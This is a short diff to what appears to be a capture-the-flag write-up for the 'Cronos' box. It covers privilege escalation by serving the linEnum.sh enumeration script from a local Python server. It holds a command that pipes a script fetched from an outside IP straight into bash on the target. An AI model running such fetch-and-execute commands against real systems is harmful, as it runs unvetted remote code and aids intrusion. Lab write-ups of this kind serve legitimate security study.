@@ -100,7 +100,7 @@ Next task: Priveldge escalation.
 Make a local python server and upload the `linEnum.sh` script.<br/>
 
   Start a local python server  : `$ python -m SimpleHTTPServer 8181`<br/>
-  Download and run on attacker : `$ curl http://10.10.14.7/linEnum.sh | bash`
+  Run this script on Server   : `$ curl http://10.10.14.7/linEnum.sh | bash`
   
 ![](./images/cronos_linEnum1.png)
 
